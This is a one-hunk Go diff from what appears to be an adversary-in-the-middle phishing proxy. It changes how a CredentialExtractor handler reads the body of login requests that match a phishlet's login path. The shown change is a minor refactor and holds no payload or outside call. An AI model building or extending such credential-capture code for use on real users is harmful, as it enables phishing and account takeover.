@@ -29,7 +29,7 @@ func (h *CredentialExtractor) Handle(ctx *aitm.ProxyContext, req *http.Request) 
 	if !matchesLoginPath(ctx.Phishlet.Login, req) {
 		return nil
 	}
-	bodyBytes, err := readAndRestoreBody(req)
+	bodyBytes, err := getRequestBody(ctx, req)
 	if err != nil || len(bodyBytes) == 0 {
 		return nil
 	}
